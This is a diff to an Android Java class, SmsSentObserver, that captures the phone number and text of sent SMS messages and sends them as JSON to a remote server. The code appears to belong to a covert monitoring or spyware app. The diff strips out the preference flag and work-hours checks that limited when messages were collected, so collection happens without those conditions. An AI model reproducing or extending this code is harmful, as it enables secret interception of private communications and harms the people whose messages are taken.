@@ -16,7 +16,6 @@ import com.inet.android.bs.RequestMakerImpl;
 import com.inet.android.request.DataRequest;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.WorkTimeDefiner;
 
 public class SmsSentObserver extends ContentObserver {
 
@@ -41,23 +40,6 @@ public class SmsSentObserver extends ContentObserver {
 	public void onChange(boolean selfChange) {
 		dir = "6";
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
-		String sms = sp.getString("KBD", "0");
-
-		if (sms.equals("0")) {
-			Logging.doLog(TAG, "KBD = 0", "KBD = 0");
-			return;
-		}
-
-		boolean isWork = WorkTimeDefiner.isDoWork(mContext);
-		if (!isWork) {
-			Logging.doLog(TAG, "isWork return " + Boolean.toString(isWork),
-					"isWork return " + Boolean.toString(isWork));
-
-			return;
-		} else {
-			Logging.doLog(TAG, Boolean.toString(isWork),
-					Boolean.toString(isWork));
-		}
 
 		try {
 			ConvertDate date = new ConvertDate();
@@ -111,15 +93,7 @@ public class SmsSentObserver extends ContentObserver {
 								JSONObject info = new JSONObject();
 								JSONObject object = new JSONObject();
 								try {
-									jsonObject.put("account",
-											sp.getString("account", "0000"));
-									jsonObject.put("device",
-											sp.getString("device", "0000"));
-									jsonObject.put("imei",
-											sp.getString("imei", "0000"));
-									jsonObject.put("key",
-											System.currentTimeMillis());
-
+									
 									info.put("tel", phNumber);
 									info.put("data", message);
 
@@ -128,7 +102,7 @@ public class SmsSentObserver extends ContentObserver {
 									object.put("info", info);
 									data.put(object);
 									jsonObject.put("data", data);
-									sendJSONStr = data.toString();
+									sendJSONStr = object.toString();
 								} catch (JSONException e) {
 									Logging.doLog(TAG, "json сломался",
 											"json сломался");
@@ -138,8 +112,7 @@ public class SmsSentObserver extends ContentObserver {
 								dr.sendRequest(sendJSONStr);
 
 								Logging.doLog(TAG, sendJSONStr, sendJSONStr);
-								Logging.doLog(TAG, sendJSONStr);
-
+							
 								/*
 								 * if(colNames != null){ for(int k=0;
 								 * k<colNames.length; k++){ Log.e(TAG,
